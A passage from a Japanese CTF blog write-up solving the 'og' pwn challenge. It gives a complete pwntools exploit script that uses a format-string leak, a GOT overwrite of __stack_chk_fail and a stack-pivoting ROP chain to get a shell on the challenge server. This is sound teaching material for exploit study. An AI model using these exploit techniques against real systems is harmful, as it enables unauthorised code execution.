            alt="image-20240612223621000"
            title="image-20240612223621000"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>そのため、今回はこのライブラリファイルから ROP Chain に使えそうな Gadget を集めていきたいと思います。</p>
<p>典型的かつ最もシンプルな ROP Chain の 1 つは以下のようなものかと思います。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">payload <span class="token operator">+=</span> flat<span class="token punctuation">(</span>
    pop_rdi_ret,
    binsh_addr,
    system_addr
<span class="token punctuation">)</span></code></pre></div>
<p>そのため、ropr などのツールを使用すると、ライブラリファイルから上記の ROP Chain に必要な Gadget は容易に取得できます。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python">pop_rdi_ret <span class="token operator">=</span> leaked_libc_base <span class="token operator">+</span> <span class="token number">0x1bbea1</span>
binsh_addr <span class="token operator">=</span> leaked_libc_base <span class="token operator">+</span> <span class="token number">0x1d8678</span>
ret <span class="token operator">=</span> leaked_libc_base <span class="token operator">+</span> <span class="token number">0x1bc065</span>
system_addr <span class="token operator">=</span> leaked_libc_base <span class="token operator">+</span> <span class="token number">0x50d70</span></code></pre></div>
<h3 id="入力の制約を回避する" style="position:relative;"><a href="#%E5%85%A5%E5%8A%9B%E3%81%AE%E5%88%B6%E7%B4%84%E3%82%92%E5%9B%9E%E9%81%BF%E3%81%99%E3%82%8B" aria-label="入力の制約を回避する permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>入力の制約を回避する</h3>
<p>しかし、ここで問題になるのは、go 関数では入力可能なバイト数が 0x42 に制限されている点です。</p>
<p>Canary と Saved RBP を含むサイズが 0x30+0x8 なので、BoF に利用できる領域がたった 10 バイトしかありません。</p>
<p>これでは ROP Chain を埋め込むことができないので、入力の制約を回避するアプローチを取る必要があります。</p>
<p>今回 go 関数の BoF で実行できる ROP Gadget は 1 つだけです。</p>
<p>この場合、OneGadget RCE のように 1 回の呼び出しで Shell を取得可能な Gadget を探すか、ROP Chain を構築するために十分なバッファを確保してそこにジャンプするといった回避方法があります。</p>
<p>すでに確認している通り今回は GOT オーバーライドによって Canary が破壊された場合にもう 1 度 go 関数を呼び出されるようになっています。</p>
<p>これを利用して、以下のように前の go 関数が確保したスタック領域を ROP Chain の格納先として使用できそうです。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token operator">|</span> <span class="token variable">$RBP</span>-0x30 <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token variable">$RBP</span>-0x28 <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token variable">$RBP</span>-0x20 <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token variable">$RBP</span>-0x18 <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token variable">$RBP</span>-0x10 <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token variable">$RBP</span>-0x8  <span class="token operator">|</span> <span class="token operator">&lt;</span>- Canary
<span class="token operator">|</span> <span class="token variable">$RBP</span>-0x0  <span class="token operator">|</span> <span class="token operator">&lt;</span>- Saved RBP
<span class="token operator">|</span> <span class="token variable">$RBP</span>+0x8  <span class="token operator">|</span> <span class="token operator">&lt;</span>- Return Address
<span class="token operator">|</span> <span class="token variable">$RBP</span>+0x10 <span class="token operator">|</span> <span class="token operator">&lt;</span>- 前の go 関数の <span class="token variable">$RBP</span>-0x30<span class="token punctuation">(</span><span class="token number">2</span> バイトのみオーバーフロー可能
<span class="token operator">|</span> <span class="token variable">$RBP</span>+0x18 <span class="token operator">|</span> <span class="token operator">&lt;</span>- 前の go 関数の <span class="token variable">$RBP</span>-0x28</code></pre></div>
<p>唯一のハードルとして、go 関数で BoF を利用して Return Address に ROP Gadget を埋め込んだ場合、次のスタック(前の go 関数の $RBP-0x30) のうち 2 バイトの値が破壊されてしまう点があります。</p>
<p>このスタックの破壊によって、前の go 関数のスタック領域に埋め込んだ ROP Chain を悪用するために、邪魔な <code class="language-text">$RBP+0x10</code> のスタックをスキップする工夫が必要になります。</p>
<p>例えば今回のバイナリの場合は適当な pop 命令を含む Gadget を実行することでこのスタックをスタックトップから排除することで $RBP+0x18 以降に埋め込んだ ROP Chain を実行できるようになり、この制約を回避できます。</p>
<h3 id="解法-2rop-で-shell-を取得する" style="position:relative;"><a href="#%E8%A7%A3%E6%B3%95-2rop-%E3%81%A7-shell-%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B" aria-label="解法 2rop で shell を取得する permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>解法 2：ROP で Shell を取得する</h3>
<p>この方法で入力の制約を回避し、$RBP+0x18 以降に埋め込んだ ROP Chain を実行するペイロードを用意しました。</p>
<p>これをスクリプト化すると以下のようになります。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment"># Set context</span>
<span class="token comment"># context.log_level = "debug"</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>
context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">"little"</span>
context<span class="token punctuation">.</span>word_size <span class="token operator">=</span> <span class="token number">64</span>

<span class="token comment"># Set target</span>
TARGET_PATH <span class="token operator">=</span> <span class="token string">"./og"</span>
elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span>TARGET_PATH<span class="token punctuation">)</span>

target <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"challs.actf.co"</span><span class="token punctuation">,</span> <span class="token number">31312</span><span class="token punctuation">)</span>

<span class="token comment"># Exploit</span>
<span class="token comment"># First stage</span>
target<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Enter your name: "</span><span class="token punctuation">)</span>
<span class="token comment"># payload = b"%64c%11$hn%4438c%10$hn%15$p" + b"\x90"*5 + p64(0x404018) + p64(0x40401a)</span>
payload <span class="token operator">=</span> <span class="token string">b"%15$p %33$pAAAAA"</span> <span class="token operator">+</span> fmtstr_payload<span class="token punctuation">(</span>offset<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">,</span> numbwritten<span class="token operator">=</span><span class="token number">38</span><span class="token punctuation">,</span> writes<span class="token operator">=</span><span class="token punctuation">{</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"__stack_chk_fail"</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token number">0x401196</span><span class="token punctuation">}</span><span class="token punctuation">,</span>write_size<span class="token operator">=</span><span class="token string">"short"</span><span class="token punctuation">)</span>
target<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

r <span class="token operator">=</span> target<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Enter your name: "</span><span class="token punctuation">)</span>
l <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">b"Gotta go. See you around, 0x7ffff7dafd90 0x952782961e0ba900"</span><span class="token punctuation">)</span>
leaked_libc_main_ret <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">[</span><span class="token punctuation">:</span>l<span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
leaked_libc_base <span class="token operator">=</span> leaked_libc_main_ret <span class="token operator">-</span> <span class="token number">0x029d90</span>
leaked_canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">[</span><span class="token punctuation">:</span>l<span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>

pop_rdi_ret <span class="token operator">=</span> leaked_libc_base <span class="token operator">+</span> <span class="token number">0x1bbea1</span>
binsh_addr <span class="token operator">=</span> leaked_libc_base <span class="token operator">+</span> <span class="token number">0x1d8678</span>
ret <span class="token operator">=</span> leaked_libc_base <span class="token operator">+</span> <span class="token number">0x1bc065</span>
system_addr <span class="token operator">=</span> leaked_libc_base <span class="token operator">+</span> <span class="token number">0x50d70</span>

<span class="token comment"># Second stage</span>
payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>
    <span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">,</span>
    pop_rdi_ret<span class="token punctuation">,</span>
    binsh_addr<span class="token punctuation">,</span>
    ret<span class="token punctuation">,</span>
    system_addr<span class="token punctuation">,</span>
    <span class="token string">b"B"</span><span class="token operator">*</span><span class="token number">0x10</span>
<span class="token punctuation">)</span>
target<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

<span class="token comment"># Third stage</span>
target<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Enter your name: "</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>
    <span class="token string">b"A"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    leaked_canary<span class="token punctuation">,</span>
    <span class="token string">b"B"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">,</span>
    pop_rdi_ret
<span class="token punctuation">)</span>
target<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

target<span class="token punctuation">.</span>clean<span class="token punctuation">(</span><span class="token punctuation">)</span>
target<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></div>
<p>First stage では、libc のベースアドレスと Canary のリークを行っています。</p>
<p>そして、続く Second Stage では、$RBP-0x28 以降の領域に ROP Chain を埋め込んだ後、意図的に Canary を破壊しています。</p>
<p>最後の Third Stage では、1 つだけ埋め込める ROP Gadget に <code class="language-text">pop rdi; ret</code> を使用することで、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mi>B</mi><mi>P</mi><mo>+</mo><mn>0</mn><mi>x</mi><mn>10</mn><mtext>のスタックをトップから取り除き、</mtext></mrow><annotation encoding="application/x-tex">RBP+0x10 のスタックをトップから取り除き、</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">RBP</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord">10</span><span class="mord cjk_fallback">のスタックをトップから取り除き、</span></span></span></span>RBP-0x28 以降の領域に埋め込んだ ROP Chain を実行することで Shell を取得しています。</p>
<p>これで、ROP を使用して Shell と Flag を取得することができました。</p>
<h2 id="まとめ" style="position:relative;"><a href="#%E3%81%BE%E3%81%A8%E3%82%81" aria-label="まとめ permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>まとめ</h2>
<p>最近 Rev に行き詰まりを感じていたので本格的に Pwn の勉強を始めました。</p>
<p>時間をかけて FSB や ROP に取り組むことで今後に応用できる知見を得られたように思います。</p></div></div></div><div class="Post-module--post__footer--3WzWU"><div><p class="Meta-module--meta__date--29eD7">Published <!-- -->Jun 14, 2024</p></div><div class="Tags-module--tags--1L_ct"><ul class="Tags-module--tags__list--91FqN"><li class="Tags-module--tags__list-item--1M30P"><a class="Tags-module--tags__list-item-link--3SL_8" href="/tag/rev/">Rev</a></li><li class="Tags-module--tags__list-item--1M30P"><a class="Tags-module--tags__list-item-link--3SL_8" href="/tag/pwn/">Pwn</a></li></ul></div><div class="Author-module--author--2Yefr"><p>リバースエンジニアになりたいCTF Player(Team: 0nePadding)。WinDbgとYARAが好き。OSCP / CISSP / AtCoder 緑 Microsoft Japanに所属してます。発言はすべて個人の見解。<a class="Author-module--author__bio-twitter--n-O9n" href="https://www.twitter.com/kash1064" rel="noopener noreferrer" target="_blank"><strong>かしわば</strong> on Twitter</a></p></div></div><div class="Post-module--post__comments--25y6I"></div></div></div></div><div id="gatsby-announcer" style="position:absolute;top:0;width:1px;height:1px;padding:0;overflow:hidden;clip:rect(0, 0, 0, 0);white-space:nowrap;border:0" aria-live="assertive" aria-atomic="true"></div></div><script id="gatsby-script-loader">/*<![CDATA[*/window.pagePath="/ctf-pwn-og";/*]]>*/</script><script id="gatsby-chunk-mapping">/*<![CDATA[*/window.___chunkMapping={"polyfill":["/polyfill-299cfcade846097f4d4b.js"],"app":["/app-558caacb7e565c191396.js"],"component---cache-caches-gatsby-plugin-offline-app-shell-js":["/component---cache-caches-gatsby-plugin-offline-app-shell-js-fd4fb51a6fac1c18bdde.js"],"component---src-templates-categories-list-template-js":["/component---src-templates-categories-list-template-js-2181ec47d28e5c35d3e9.js"],"component---src-templates-category-template-js":["/component---src-templates-category-template-js-76f2006942127b3c7274.js"],"component---src-templates-index-template-js":["/component---src-templates-index-template-js-70ba56c0f46525baa629.js"],"component---src-templates-not-found-template-js":["/component---src-templates-not-found-template-js-d19905e5c8fc953958f1.js"],"component---src-templates-page-template-js":["/component---src-templates-page-template-js-6ba68ef37e264f701345.js"],"component---src-templates-post-template-js":["/component---src-templates-post-template-js-381c1b847824134fa4bd.js"],"component---src-templates-tag-template-js":["/component---src-templates-tag-template-js-0faa242d92f89b71e668.js"],"component---src-templates-tags-list-template-js":["/component---src-templates-tags-list-template-js-2d7007993fc2bf0f9caf.js"]};/*]]>*/</script><script src="/polyfill-299cfcade846097f4d4b.js" nomodule=""></script><script src="/component---src-templates-post-template-js-381c1b847824134fa4bd.js" async=""></script><script src="/cd95ea5cbd2c605f26db819f07999610c9ff4310-c2f05dc74373de400085.js" async=""></script><script src="/styles-407fe62976dc5310c43e.js" async=""></script><script src="/app-558caacb7e565c191396.js" async=""></script><script src="/dc6a8720040df98778fe970bf6c000a41750d3ae-4b437d98a9f47dfe350f.js" async=""></script><script src="/532a2f07-92db97c0addf07d5cb73.js" async=""></script><script src="/framework-3761df4ab6ee9f056936.js" async=""></script><script src="/webpack-runtime-a3c0f166cb4b802ff58f.js" async=""></script></body></html>